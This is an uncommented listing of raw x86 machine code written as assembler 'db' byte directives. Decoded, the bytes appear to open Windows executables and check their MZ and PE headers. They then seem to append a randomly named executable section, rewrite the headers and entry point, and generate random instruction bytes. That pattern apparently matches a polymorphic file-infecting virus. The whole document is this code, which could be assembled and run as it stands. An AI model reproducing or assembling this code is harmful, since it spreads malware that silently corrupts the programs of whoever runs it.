db 088h, 050h, 003h, 083h, 0c1h, 0fch, 083h, 0c0h, 004h, 051h, 050h, 0ffh, 075h, 014h
db 052h, 053h, 0ebh, 0d1h, 08bh, 05dh, 010h, 088h, 050h, 001h, 088h, 058h, 002h, 083h
db 0c1h, 0fdh, 083h, 0c0h, 003h, 051h, 050h, 0ffh, 075h, 014h, 053h, 052h, 0ffh, 075h
db 008h, 0e8h, 0ceh, 0f2h, 0ffh, 0ffh, 083h, 0c4h, 018h, 083h, 0c0h, 003h, 0ebh, 088h
db 055h, 08bh, 0ech, 083h, 07dh, 010h, 000h, 053h, 08bh, 05dh, 008h, 056h, 057h, 074h
db 01fh, 083h, 07dh, 010h, 003h, 074h, 019h, 083h, 07dh, 010h, 001h, 074h, 013h, 08bh
db 07dh, 01ch, 06ah, 0f1h, 057h, 0ffh, 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 00ch
db 06ah, 004h, 0ebh, 011h, 08bh, 07dh, 01ch, 06ah, 0f1h, 057h, 0ffh, 075h, 018h, 0ffh
db 075h, 014h, 0ffh, 075h, 00ch, 06ah, 003h, 0e8h, 093h, 0f4h, 0ffh, 0ffh, 08bh, 0f0h
db 083h, 0c4h, 018h, 085h, 0f6h, 00fh, 084h, 0c8h, 000h, 000h, 000h, 089h, 075h, 014h
db 085h, 0dbh, 074h, 06fh, 083h, 07bh, 01ch, 000h, 074h, 03dh, 08ah, 045h, 00ch, 004h
db 032h, 088h, 004h, 03eh, 046h, 089h, 075h, 01ch, 08dh, 004h, 03eh, 050h, 0ffh, 075h
db 018h, 0ffh, 073h, 024h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0ffh, 073h, 020h, 0e8h
db 07eh, 0ffh, 0ffh, 0ffh, 003h, 0f0h, 083h, 0c4h, 018h, 039h, 075h, 01ch, 00fh, 084h
db 089h, 000h, 000h, 000h, 08ah, 045h, 00ch, 004h, 03ah, 088h, 004h, 03eh, 046h, 0ebh
db 028h, 0ffh, 073h, 018h, 08dh, 004h, 03eh, 089h, 075h, 01ch, 050h, 0ffh, 073h, 014h
db 0ffh, 073h, 010h, 0ffh, 073h, 00ch, 0ffh, 073h, 008h, 0ffh, 073h, 004h, 0e8h, 0e2h
db 0f0h, 0ffh, 0ffh, 003h, 0f0h, 083h, 0c4h, 01ch, 039h, 075h, 01ch, 074h, 056h, 08bh
db 01bh, 0ebh, 08dh, 083h, 07dh, 010h, 000h, 074h, 050h, 083h, 07dh, 010h, 003h, 074h
db 04ah, 083h, 07dh, 010h, 001h, 074h, 044h, 08dh, 004h, 03eh, 06ah, 0f1h, 050h, 08bh
db 0deh, 0ffh, 075h, 018h, 06ah, 001h, 0ffh, 075h, 00ch, 06ah, 004h, 0e8h, 02dh, 0f8h
db 0ffh, 0ffh, 003h, 0f0h, 083h, 0c4h, 018h, 03bh, 0f3h, 074h, 020h, 08dh, 004h, 03eh
db 06ah, 0f1h, 050h, 08bh, 0deh, 0ffh, 075h, 018h, 06ah, 000h, 0ffh, 075h, 00ch, 06ah
db 004h, 0e8h, 043h, 0fch, 0ffh, 0ffh, 003h, 0f0h, 083h, 0c4h, 018h, 03bh, 0f3h, 075h
db 038h, 033h, 0c0h, 0ebh, 04bh, 08dh, 004h, 03eh, 06ah, 0f1h, 050h, 08bh, 0deh, 0ffh
db 075h, 018h, 06ah, 001h, 0ffh, 075h, 00ch, 06ah, 003h, 0e8h, 0e9h, 0f7h, 0ffh, 0ffh
db 003h, 0f0h, 083h, 0c4h, 018h, 03bh, 0f3h, 074h, 0dch, 08dh, 004h, 03eh, 06ah, 0f1h
db 050h, 08bh, 0deh, 0ffh, 075h, 018h, 06ah, 000h, 0ffh, 075h, 00ch, 06ah, 003h, 0ebh
db 0bah, 08bh, 045h, 014h, 003h, 0feh, 02bh, 0c6h, 0c6h, 007h, 00fh, 083h, 0e8h, 006h
db 0c6h, 047h, 001h, 085h, 089h, 047h, 002h, 08dh, 046h, 006h, 05fh, 05eh, 05bh, 05dh
db 0c3h, 056h, 08bh, 074h, 024h, 008h, 085h, 0f6h, 074h, 020h, 08bh, 006h, 085h, 0c0h
db 074h, 006h, 08bh, 0f0h, 085h, 0f6h, 075h, 0f4h, 085h, 0f6h, 074h, 010h, 06ah, 001h
db 06ah, 028h, 0ffh, 015h, 008h, 04dh, 000h, 000h, 059h, 089h, 006h, 059h, 0ebh, 00ch
db 06ah, 001h, 06ah, 028h, 0ffh, 015h, 008h, 04dh, 000h, 000h, 059h, 059h, 085h, 0c0h
db 05eh, 074h, 03eh, 08bh, 04ch, 024h, 008h, 08bh, 051h, 014h, 089h, 050h, 014h, 08bh
db 051h, 018h, 083h, 020h, 000h, 089h, 050h, 018h, 08bh, 051h, 00ch, 089h, 050h, 00ch
db 08bh, 051h, 010h, 089h, 050h, 010h, 08bh, 051h, 004h, 089h, 050h, 004h, 08bh, 051h
db 008h, 089h, 050h, 008h, 08bh, 051h, 020h, 089h, 050h, 020h, 08bh, 051h, 01ch, 089h
db 050h, 01ch, 08bh, 049h, 024h, 089h, 048h, 024h, 0c3h, 033h, 0c0h, 0c3h, 056h, 08bh
db 074h, 024h, 008h, 085h, 0f6h, 074h, 00eh, 08bh, 0c6h, 08bh, 036h, 050h, 0ffh, 015h
db 00ch, 04dh, 000h, 000h, 059h, 0ebh, 0eeh, 05eh, 0c3h, 08bh, 044h, 024h, 004h, 083h
db 0f8h, 007h, 077h, 029h, 0ffh, 024h, 085h, 07ch, 033h, 000h, 000h, 06ah, 001h, 0ebh
db 016h, 06ah, 008h, 0ebh, 012h, 06ah, 002h, 0ebh, 00eh, 06ah, 004h, 0ebh, 00ah, 06ah
db 020h, 0ebh, 006h, 06ah, 010h, 0ebh, 002h, 06ah, 040h, 058h, 0c3h, 0b8h, 080h, 000h
db 000h, 000h, 0c3h, 033h, 0c0h, 0c3h, 057h, 033h, 000h, 000h, 05fh, 033h, 000h, 000h
db 063h, 033h, 000h, 000h, 05bh, 033h, 000h, 000h, 06bh, 033h, 000h, 000h, 067h, 033h
db 000h, 000h, 06fh, 033h, 000h, 000h, 073h, 033h, 000h, 000h, 056h, 057h, 068h, 074h
db 014h, 000h, 000h, 0ffh, 074h, 024h, 010h, 0ffh, 015h, 0d0h, 04ch, 000h, 000h, 08bh
db 0f8h, 059h, 085h, 0ffh, 059h, 00fh, 084h, 08ch, 000h, 000h, 000h, 06ah, 000h, 06ah
db 000h, 057h, 0ffh, 015h, 0e0h, 04ch, 000h, 000h, 083h, 0c4h, 00ch, 085h, 0c0h, 075h
db 072h, 08bh, 074h, 024h, 010h, 057h, 06ah, 001h, 06ah, 040h, 056h, 0ffh, 015h, 0d8h
db 04ch, 000h, 000h, 083h, 0c4h, 010h, 085h, 0c0h, 074h, 05bh, 06ah, 000h, 0ffh, 076h
db 03ch, 057h, 0ffh, 015h, 0e0h, 04ch, 000h, 000h, 083h, 0c4h, 00ch, 085h, 0c0h, 075h
db 048h, 057h, 06ah, 001h, 08dh, 046h, 040h, 068h, 0f8h, 000h, 000h, 000h, 050h, 0ffh
db 015h, 0d8h, 04ch, 000h, 000h, 083h, 0c4h, 010h, 085h, 0c0h, 074h, 02fh, 00fh, 0b7h
db 046h, 046h, 057h, 06ah, 001h, 08dh, 004h, 080h, 081h, 0c6h, 038h, 001h, 000h, 000h
db 0c1h, 0e0h, 003h, 050h, 056h, 0ffh, 015h, 0d8h, 04ch, 000h, 000h, 083h, 0c4h, 010h
db 085h, 0c0h, 074h, 00dh, 057h, 0ffh, 015h, 0d4h, 04ch, 000h, 000h, 059h, 06ah, 001h
db 058h, 0ebh, 00ah, 057h, 0ffh, 015h, 0d4h, 04ch, 000h, 000h, 059h, 033h, 0c0h, 05fh
db 05eh, 0c3h, 055h, 08bh, 0ech, 08bh, 045h, 008h, 056h, 033h, 0c9h, 08bh, 0b0h, 04ch
db 001h, 000h, 000h, 08dh, 090h, 048h, 001h, 000h, 000h, 003h, 032h, 039h, 075h, 00ch
db 072h, 00ah, 090h, 08bh, 072h, 02ch, 041h, 083h, 0c2h, 028h, 0ebh, 0efh, 08dh, 00ch
db 089h, 05eh, 08dh, 00ch, 0c8h, 08bh, 081h, 044h, 001h, 000h, 000h, 02bh, 081h, 04ch
db 001h, 000h, 000h, 003h, 045h, 00ch, 05dh, 0c3h, 055h, 08bh, 0ech, 08bh, 045h, 008h
db 056h, 033h, 0c9h, 08bh, 0b0h, 048h, 001h, 000h, 000h, 08dh, 090h, 044h, 001h, 000h
db 000h, 003h, 032h, 039h, 075h, 00ch, 072h, 00ah, 090h, 08bh, 072h, 02ch, 041h, 083h
db 0c2h, 028h, 0ebh, 0efh, 08dh, 00ch, 089h, 05eh, 08dh, 00ch, 0c8h, 08bh, 081h, 04ch
db 001h, 000h, 000h, 02bh, 081h, 044h, 001h, 000h, 000h, 003h, 045h, 00ch, 05dh, 0c3h
db 055h, 08bh, 0ech, 081h, 0ech, 048h, 001h, 000h, 000h, 053h, 056h, 057h, 068h, 074h
db 014h, 000h, 000h, 0ffh, 075h, 008h, 0ffh, 015h, 0d0h, 04ch, 000h, 000h, 08bh, 0f8h
db 033h, 0f6h, 059h, 03bh, 0feh, 059h, 089h, 07dh, 008h, 00fh, 084h, 072h, 002h, 000h
db 000h, 057h, 06ah, 001h, 08dh, 045h, 0b0h, 06ah, 040h, 050h, 0ffh, 015h, 0d8h, 04ch
db 000h, 000h, 083h, 0c4h, 010h, 085h, 0c0h, 00fh, 084h, 0c7h, 002h, 000h, 000h, 056h
db 0ffh, 075h, 0ech, 057h, 0ffh, 015h, 0e0h, 04ch, 000h, 000h, 057h, 06ah, 001h, 08dh
db 085h, 0b8h, 0feh, 0ffh, 0ffh, 068h, 0f8h, 000h, 000h, 000h, 050h, 0ffh, 015h, 0d8h
db 04ch, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 00fh, 084h, 09ch, 002h, 000h, 000h
db 00fh, 0b7h, 0bdh, 0beh, 0feh, 0ffh, 0ffh, 089h, 07dh, 0f8h, 08dh, 01ch, 0bfh, 0c1h
db 0e3h, 003h, 053h, 06ah, 001h, 089h, 05dh, 0f4h, 0ffh, 015h, 008h, 04dh, 000h, 000h
db 08bh, 0f0h, 059h, 085h, 0f6h, 059h, 00fh, 084h, 074h, 002h, 000h, 000h, 0ffh, 075h
db 008h, 0ffh, 015h, 0e8h, 04ch, 000h, 000h, 0ffh, 075h, 008h, 089h, 045h, 0f0h, 057h
db 06ah, 028h, 056h, 0ffh, 015h, 0d8h, 04ch, 000h, 000h, 083h, 0c4h, 014h, 03bh, 0c7h
db 074h, 017h, 0ffh, 075h, 008h, 0ffh, 015h, 0d4h, 04ch, 000h, 000h, 056h, 0ffh, 015h
db 00ch, 04dh, 000h, 000h, 059h, 059h, 0e9h, 0ceh, 001h, 000h, 000h, 08bh, 07ch, 033h
db 0e4h, 003h, 07ch, 033h, 0e8h, 02bh, 07eh, 00ch, 057h, 06ah, 001h, 0ffh, 015h, 008h
db 04dh, 000h, 000h, 033h, 0d2h, 059h, 03bh, 0c2h, 059h, 089h, 045h, 0fch, 074h, 0cah
db 08bh, 046h, 00ch, 08bh, 04eh, 008h, 003h, 0c8h, 08bh, 045h, 00ch, 089h, 008h, 08bh
db 046h, 034h, 03bh, 0c8h, 073h, 009h, 02bh, 0c1h, 08bh, 04dh, 010h, 089h, 001h, 0ebh
db 005h, 08bh, 045h, 010h, 089h, 010h, 039h, 055h, 0f8h, 089h, 055h, 00ch, 076h, 050h
db 08dh, 046h, 014h, 089h, 045h, 010h, 0ebh, 003h, 08bh, 045h, 010h, 08bh, 058h, 0f8h
db 06ah, 000h, 0ffh, 030h, 02bh, 05eh, 00ch, 0ffh, 075h, 008h, 003h, 05dh, 0fch, 0ffh
db 015h, 0e0h, 04ch, 000h, 000h, 0ffh, 075h, 008h, 08bh, 045h, 010h, 06ah, 001h, 0ffh
db 070h, 0fch, 053h, 0ffh, 015h, 0d8h, 04ch, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h
db 00fh, 084h, 02bh, 001h, 000h, 000h, 0ffh, 045h, 00ch, 083h, 045h, 010h, 028h, 08bh
db 045h, 00ch, 03bh, 045h, 0f8h, 072h, 0bbh, 08bh, 05dh, 0f4h, 06ah, 000h, 0ffh, 076h
db 014h, 0ffh, 075h, 008h, 0ffh, 015h, 0e0h, 04ch, 000h, 000h, 0ffh, 075h, 008h, 06ah
db 001h, 057h, 0ffh, 075h, 0fch, 0ffh, 015h, 0dch, 04ch, 000h, 000h, 083h, 0c4h, 01ch
db 085h, 0c0h, 00fh, 084h, 0f1h, 000h, 000h, 000h, 080h, 04eh, 027h, 0e0h, 0e8h, 00ch
db 012h, 000h, 000h, 0a8h, 001h, 074h, 004h, 083h, 04eh, 024h, 020h, 0e8h, 0ffh, 011h
db 000h, 000h, 0a8h, 001h, 074h, 004h, 083h, 04eh, 024h, 040h, 0e8h, 0f2h, 011h, 000h
db 000h, 0a8h, 001h, 074h, 004h, 080h, 04eh, 024h, 080h, 089h, 07eh, 010h, 089h, 07eh
db 008h, 0e8h, 0dfh, 011h, 000h, 000h, 0a8h, 001h, 00fh, 084h, 084h, 000h, 000h, 000h
db 0e8h, 0d2h, 011h, 000h, 000h, 0f6h, 0d0h, 024h, 001h, 0c0h, 0e0h, 005h, 00ch, 05ah
db 088h, 006h, 0e8h, 0c2h, 011h, 000h, 000h, 0f6h, 0d0h, 024h, 001h, 0c0h, 0e0h, 005h
db 00ch, 045h, 088h, 046h, 001h, 0e8h, 0b1h, 011h, 000h, 000h, 0f6h, 0d0h, 024h, 001h
db 0c0h, 0e0h, 005h, 00ch, 059h, 088h, 046h, 002h, 0e8h, 0a0h, 011h, 000h, 000h, 0f6h
db 0d0h, 024h, 001h, 0c0h, 0e0h, 005h, 00ch, 041h, 088h, 046h, 003h, 0e8h, 08fh, 011h
db 000h, 000h, 0f6h, 0d0h, 024h, 001h, 0c0h, 0e0h, 005h, 00ch, 056h, 088h, 046h, 004h
db 0e8h, 07eh, 011h, 000h, 000h, 0a8h, 001h, 074h, 01bh, 0c6h, 046h, 005h, 032h, 0c6h
db 046h, 006h, 039h, 0e8h, 06dh, 011h, 000h, 000h, 0f6h, 0d0h, 024h, 001h, 0c0h, 0e0h
db 005h, 00ch, 041h, 088h, 046h, 007h, 0ebh, 00ch, 0c6h, 046h, 005h, 036h, 0c6h, 046h
db 006h, 036h, 0c6h, 046h, 007h, 036h, 06ah, 000h, 0ffh, 075h, 0f0h, 0ffh, 075h, 008h
db 0ffh, 015h, 0e0h, 04ch, 000h, 000h, 08dh, 043h, 0d8h, 050h, 08dh, 046h, 028h, 050h
db 0e8h, 0b0h, 000h, 000h, 000h, 0ffh, 075h, 008h, 06ah, 001h, 053h, 056h, 0ffh, 015h
db 0dch, 04ch, 000h, 000h, 083h, 0c4h, 024h, 085h, 0c0h, 075h, 020h, 0ffh, 075h, 008h
db 0ffh, 015h, 0d4h, 04ch, 000h, 000h, 056h, 0ffh, 015h, 00ch, 04dh, 000h, 000h, 0ffh
db 075h, 0fch, 0ffh, 015h, 00ch, 04dh, 000h, 000h, 083h, 0c4h, 00ch, 033h, 0c0h, 0ebh
db 077h, 08bh, 085h, 0f0h, 0feh, 0ffh, 0ffh, 089h, 0bdh, 0d4h, 0feh, 0ffh, 0ffh, 089h
db 0bdh, 0d8h, 0feh, 0ffh, 0ffh, 08bh, 04eh, 010h, 003h, 04eh, 00ch, 06ah, 000h, 0ffh
db 075h, 0ech, 066h, 0c7h, 085h, 0beh, 0feh, 0ffh, 0ffh, 001h, 000h, 0ffh, 075h, 008h
db 08dh, 04ch, 001h, 0ffh, 048h, 0f7h, 0d0h, 023h, 0c8h, 089h, 08dh, 008h, 0ffh, 0ffh
db 0ffh, 0ffh, 015h, 0e0h, 04ch, 000h, 000h, 0ffh, 075h, 008h, 08dh, 085h, 0b8h, 0feh
db 0ffh, 0ffh, 06ah, 001h, 068h, 0f8h, 000h, 000h, 000h, 050h, 0ffh, 015h, 0dch, 04ch
db 000h, 000h, 056h, 0ffh, 015h, 00ch, 04dh, 000h, 000h, 0ffh, 075h, 0fch, 0ffh, 015h
db 00ch, 04dh, 000h, 000h, 083h, 0c4h, 024h, 06ah, 001h, 05eh, 0ffh, 075h, 008h, 0ffh
db 015h, 0d4h, 04ch, 000h, 000h, 059h, 08bh, 0c6h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 08bh
db 04ch, 024h, 008h, 085h, 0c9h, 076h, 016h, 08bh, 0d1h, 057h, 08bh, 07ch, 024h, 008h
db 033h, 0c0h, 0c1h, 0e9h, 002h, 0f3h, 0abh, 08bh, 0cah, 083h, 0e1h, 003h, 0f3h, 0aah
db 05fh, 0c3h, 055h, 08bh, 0ech, 081h, 0ech, 044h, 001h, 000h, 000h, 053h, 056h, 057h
db 068h, 074h, 014h, 000h, 000h, 0ffh, 075h, 008h, 0ffh, 015h, 0d0h, 04ch, 000h, 000h
db 08bh, 0d8h, 059h, 085h, 0dbh, 059h, 00fh, 084h, 0fbh, 000h, 000h, 000h, 053h, 06ah
db 001h, 08dh, 045h, 0b4h, 06ah, 040h, 050h, 0ffh, 015h, 0d8h, 04ch, 000h, 000h, 083h
db 0c4h, 010h, 085h, 0c0h, 075h, 00ch, 053h, 0ffh, 015h, 0d4h, 04ch, 000h, 000h, 0e9h
db 0d8h, 000h, 000h, 000h, 06ah, 000h, 0ffh, 075h, 0f0h, 053h, 0ffh, 015h, 0e0h, 04ch
db 000h, 000h, 053h, 06ah, 001h, 08dh, 085h, 0bch, 0feh, 0ffh, 0ffh, 068h, 0f8h, 000h
db 000h, 000h, 050h, 0ffh, 015h, 0d8h, 04ch, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h
db 074h, 0cch, 00fh, 0b7h, 0bdh, 0c2h, 0feh, 0ffh, 0ffh, 089h, 07dh, 0f8h, 08dh, 034h
db 0bfh, 0c1h, 0e6h, 003h, 056h, 06ah, 001h, 0ffh, 015h, 008h, 04dh, 000h, 000h, 059h
db 089h, 045h, 0fch, 059h, 085h, 0c0h, 053h, 074h, 0aah, 0ffh, 015h, 0e8h, 04ch, 000h
db 000h, 053h, 057h, 06ah, 028h, 089h, 045h, 0f4h, 0ffh, 075h, 0fch, 0ffh, 015h, 0d8h
db 04ch, 000h, 000h, 083h, 0c4h, 014h, 03bh, 0c7h, 074h, 007h, 033h, 0f6h, 0e9h, 0ech
db 000h, 000h, 000h, 08bh, 085h, 0f8h, 0feh, 0ffh, 0ffh, 08bh, 04dh, 00ch, 06ah, 000h
db 08dh, 07ch, 008h, 0ffh, 048h, 0f7h, 0d0h, 023h, 0f8h, 08bh, 045h, 0fch, 003h, 0f0h
db 08bh, 046h, 0ech, 003h, 046h, 0e8h, 050h, 053h, 0ffh, 015h, 0e0h, 04ch, 000h, 000h
db 053h, 0ffh, 015h, 0e8h, 04ch, 000h, 000h, 089h, 045h, 00ch, 08dh, 047h, 0ffh, 06ah
db 001h, 050h, 053h, 0ffh, 015h, 0e0h, 04ch, 000h, 000h, 080h, 065h, 00bh, 000h, 053h
db 06ah, 001h, 08dh, 045h, 00bh, 06ah, 001h, 050h, 0ffh, 015h, 0dch, 04ch, 000h, 000h
db 083h, 0c4h, 02ch, 085h, 0c0h, 075h, 019h, 053h, 0ffh, 015h, 0d4h, 04ch, 000h, 000h
db 0ffh, 075h, 0fch, 0ffh, 015h, 00ch, 04dh, 000h, 000h, 059h, 059h, 033h, 0c0h, 0e9h
db 08fh, 000h, 000h, 000h, 06ah, 000h, 0ffh, 075h, 0f4h, 053h, 0ffh, 015h, 0e0h, 04ch
db 000h, 000h, 001h, 07eh, 0e8h, 053h, 0ffh, 075h, 0f8h, 001h, 07eh, 0e0h, 06ah, 028h
db 0ffh, 075h, 0fch, 0ffh, 015h, 0dch, 04ch, 000h, 000h, 083h, 0c4h, 01ch, 03bh, 045h
db 0f8h, 00fh, 085h, 05bh, 0ffh, 0ffh, 0ffh, 001h, 0bdh, 0d8h, 0feh, 0ffh, 0ffh, 001h
db 0bdh, 0dch, 0feh, 0ffh, 0ffh, 08bh, 04eh, 0e4h, 08bh, 085h, 0f4h, 0feh, 0ffh, 0ffh
db 003h, 04eh, 0e8h, 06ah, 000h, 0ffh, 075h, 0f0h, 08dh, 04ch, 001h, 0ffh, 048h, 0f7h
db 0d0h, 023h, 0c8h, 053h, 089h, 08dh, 00ch, 0ffh, 0ffh, 0ffh, 0ffh, 015h, 0e0h, 04ch
db 000h, 000h, 053h, 06ah, 001h, 08dh, 085h, 0bch, 0feh, 0ffh, 0ffh, 068h, 0f8h, 000h
db 000h, 000h, 050h, 0ffh, 015h, 0dch, 04ch, 000h, 000h, 08bh, 075h, 00ch, 083h, 0c4h
db 01ch, 053h, 0ffh, 015h, 0d4h, 04ch, 000h, 000h, 0ffh, 075h, 0fch, 0ffh, 015h, 00ch
db 04dh, 000h, 000h, 059h, 08bh, 0c6h, 059h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 055h, 08bh
db 0ech, 081h, 0ech, 008h, 009h, 000h, 000h, 053h, 057h, 068h, 074h, 014h, 000h, 000h
db 0ffh, 075h, 008h, 0ffh, 015h, 0d0h, 04ch, 000h, 000h, 08bh, 0f8h, 033h, 0dbh, 059h
db 03bh, 0fbh, 059h, 075h, 007h, 033h, 0c0h, 0e9h, 08dh, 000h, 000h, 000h, 057h, 06ah
db 001h, 08dh, 085h, 0f8h, 0f6h, 0ffh, 0ffh, 06ah, 040h, 050h, 0ffh, 015h, 0d8h, 04ch
db 000h, 000h, 083h, 0c4h, 010h, 085h, 0c0h, 075h, 008h, 057h, 0ffh, 015h, 0d4h, 04ch
db 000h, 000h, 059h, 056h, 053h, 0ffh, 0b5h, 034h, 0f7h, 0ffh, 0ffh, 057h, 0ffh, 015h
db 0e0h, 04ch, 000h, 000h, 057h, 0beh, 0f8h, 000h, 000h, 000h, 06ah, 001h, 08dh, 085h
db 038h, 0f7h, 0ffh, 0ffh, 056h, 050h, 0ffh, 015h, 0d8h, 04ch, 000h, 000h, 083h, 0c4h
db 01ch, 085h, 0c0h, 074h, 035h, 053h, 0ffh, 0b5h, 034h, 0f7h, 0ffh, 0ffh, 057h, 0ffh
db 015h, 0e0h, 04ch, 000h, 000h, 057h, 06ah, 001h, 08dh, 085h, 038h, 0f7h, 0ffh, 0ffh
db 056h, 050h, 089h, 09dh, 0dch, 0f7h, 0ffh, 0ffh, 089h, 09dh, 0d8h, 0f7h, 0ffh, 0ffh
db 0ffh, 015h, 0dch, 04ch, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 074h, 003h, 06ah
db 001h, 05bh, 057h, 0ffh, 015h, 0d4h, 04ch, 000h, 000h, 059h, 08bh, 0c3h, 05eh, 05fh
db 05bh, 0c9h, 0c3h, 055h, 08bh, 0ech, 081h, 0ech, 008h, 009h, 000h, 000h, 056h, 068h
db 074h, 014h, 000h, 000h, 0ffh, 075h, 008h, 0ffh, 015h, 0d0h, 04ch, 000h, 000h, 08bh
db 0f0h, 059h, 085h, 0f6h, 059h, 074h, 06dh, 056h, 06ah, 001h, 08dh, 085h, 0f8h, 0f6h
db 0ffh, 0ffh, 06ah, 040h, 050h, 0ffh, 015h, 0d8h, 04ch, 000h, 000h, 083h, 0c4h, 010h
db 085h, 0c0h, 075h, 008h, 056h, 0ffh, 015h, 0d4h, 04ch, 000h, 000h, 059h, 066h, 081h
db 0bdh, 0f8h, 0f6h, 0ffh, 0ffh, 05ah, 04dh, 074h, 00eh, 066h, 081h, 0bdh, 0f8h, 0f6h
db 0ffh, 0ffh, 04dh, 05ah, 074h, 003h, 056h, 0ebh, 02ch, 06ah, 000h, 0ffh, 0b5h, 034h
db 0f7h, 0ffh, 0ffh, 056h, 0ffh, 015h, 0e0h, 04ch, 000h, 000h, 056h, 06ah, 001h, 08dh
db 085h, 038h, 0f7h, 0ffh, 0ffh, 068h, 0f8h, 000h, 000h, 000h, 050h, 0ffh, 015h, 0d8h
db 04ch, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 056h, 075h, 00ch, 0ffh, 015h, 0d4h
db 04ch, 000h, 000h, 059h, 033h, 0c0h, 05eh, 0c9h, 0c3h, 0ffh, 015h, 0d4h, 04ch, 000h
db 000h, 081h, 0bdh, 038h, 0f7h, 0ffh, 0ffh, 050h, 045h, 000h, 000h, 059h, 075h, 0e8h
db 066h, 083h, 0bdh, 03eh, 0f7h, 0ffh, 0ffh, 001h, 074h, 0deh, 066h, 083h, 0bdh, 094h
db 0f7h, 0ffh, 0ffh, 001h, 074h, 0d4h, 0f6h, 085h, 04fh, 0f7h, 0ffh, 0ffh, 010h, 075h
db 0cbh, 066h, 081h, 0bdh, 03ch, 0f7h, 0ffh, 0ffh, 04ch, 001h, 075h, 0c0h, 06ah, 001h
db 058h, 0ebh, 0bdh, 055h, 08bh, 0ech, 081h, 0ech, 018h, 009h, 000h, 000h, 053h, 056h
db 057h, 033h, 0dbh, 06ah, 014h, 06ah, 00ah, 089h, 05dh, 0f4h, 089h, 05dh, 0f8h, 0e8h
db 080h, 00dh, 000h, 000h, 0ffh, 075h, 010h, 0c1h, 0e0h, 00ah, 001h, 045h, 014h, 06ah
db 001h, 0ffh, 015h, 008h, 04dh, 000h, 000h, 08bh, 0f0h, 083h, 0c4h, 010h, 03bh, 0f3h
db 00fh, 084h, 045h, 001h, 000h, 000h, 033h, 0ffh, 039h, 05dh, 010h, 076h, 011h, 08bh
db 04dh, 00ch, 02bh, 0ceh, 08ah, 014h, 001h, 047h, 088h, 010h, 040h, 03bh, 07dh, 010h
db 072h, 0f4h, 08bh, 045h, 018h, 06ah, 014h, 06ah, 00ah, 089h, 05dh, 00ch, 089h, 01ch
db 006h, 08bh, 045h, 010h, 089h, 045h, 0fch, 0e8h, 080h, 00dh, 000h, 000h, 059h, 089h
db 045h, 018h, 059h, 0e8h, 0abh, 00ch, 000h, 000h, 0a8h, 03fh, 075h, 00eh, 06ah, 064h
db 06ah, 032h, 0e8h, 069h, 00dh, 000h, 000h, 059h, 089h, 045h, 018h, 059h, 039h, 05dh
db 018h, 076h, 04dh, 08dh, 045h, 0f0h, 050h, 0ffh, 075h, 0fch, 056h, 0e8h, 02eh, 0e5h
db 0ffh, 0ffh, 056h, 08bh, 0f8h, 0ffh, 015h, 00ch, 04dh, 000h, 000h, 083h, 0c4h, 010h
db 03bh, 0fbh, 00fh, 084h, 0d3h, 000h, 000h, 000h, 08dh, 045h, 0fch, 050h, 0ffh, 075h
db 0f0h, 057h, 0e8h, 00dh, 0e5h, 0ffh, 0ffh, 057h, 08bh, 0f0h, 0ffh, 015h, 00ch, 04dh
db 000h, 000h, 083h, 0c4h, 010h, 03bh, 0f3h, 00fh, 084h, 0b2h, 000h, 000h, 000h, 0ffh
db 045h, 00ch, 08bh, 045h, 00ch, 03bh, 045h, 018h, 072h, 0b3h, 08bh, 045h, 0fch, 089h
db 075h, 00ch, 089h, 045h, 010h, 0e8h, 039h, 00ch, 000h, 000h, 0a8h, 03fh, 075h, 013h
db 08dh, 045h, 010h, 050h, 0ffh, 075h, 010h, 056h, 0e8h, 0bfh, 0e5h, 0ffh, 0ffh, 083h
db 0c4h, 00ch, 089h, 045h, 00ch, 08dh, 045h, 0f8h, 050h, 08dh, 045h, 0f4h, 050h, 0ffh
db 075h, 008h, 0e8h, 06dh, 0f8h, 0ffh, 0ffh, 083h, 0c4h, 00ch, 085h, 0c0h, 075h, 00bh
db 0ffh, 075h, 00ch, 0ffh, 015h, 00ch, 04dh, 000h, 000h, 0ebh, 05fh, 08bh, 045h, 010h
db 08bh, 04dh, 014h, 003h, 0c1h, 050h, 0ffh, 075h, 008h, 0e8h, 086h, 0fbh, 0ffh, 0ffh
db 08bh, 0f0h, 059h, 03bh, 0f3h, 059h, 074h, 0dch, 068h, 074h, 014h, 000h, 000h, 0ffh
db 075h, 008h, 0ffh, 015h, 0d0h, 04ch, 000h, 000h, 08bh, 0f8h, 059h, 03bh, 0fbh, 059h
db 074h, 0c6h, 053h, 056h, 057h, 0ffh, 015h, 0e0h, 04ch, 000h, 000h, 057h, 06ah, 001h
db 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0ffh, 015h, 0dch, 04ch, 000h, 000h, 083h, 0c4h
db 01ch, 085h, 0c0h, 075h, 019h, 0ffh, 075h, 00ch, 0ffh, 015h, 00ch, 04dh, 000h, 000h
db 057h, 0ffh, 015h, 0d4h, 04ch, 000h, 000h, 059h, 059h, 033h, 0c0h, 0e9h, 0b5h, 000h
db 000h, 000h, 0ffh, 075h, 014h, 06ah, 001h, 0ffh, 015h, 008h, 04dh, 000h, 000h, 08bh
db 0d8h, 059h, 085h, 0dbh, 059h, 074h, 020h, 0ffh, 075h, 014h, 053h, 0e8h, 08ch, 00ch
db 000h, 000h, 057h, 06ah, 001h, 0ffh, 075h, 014h, 053h, 0ffh, 015h, 0dch, 04ch, 000h
db 000h, 053h, 0ffh, 015h, 00ch, 04dh, 000h, 000h, 083h, 0c4h, 01ch, 057h, 0ffh, 015h
db 0d4h, 04ch, 000h, 000h, 0ffh, 075h, 00ch, 0ffh, 015h, 00ch, 04dh, 000h, 000h, 08dh
db 085h, 0e8h, 0f6h, 0ffh, 0ffh, 050h, 0ffh, 075h, 008h, 0e8h, 078h, 0f6h, 0ffh, 0ffh
db 08dh, 085h, 0e8h, 0f6h, 0ffh, 0ffh, 056h, 050h, 0e8h, 019h, 0f7h, 0ffh, 0ffh, 08bh
db 0f8h, 08bh, 045h, 010h, 003h, 0c6h, 050h, 08dh, 085h, 0e8h, 0f6h, 0ffh, 0ffh, 050h
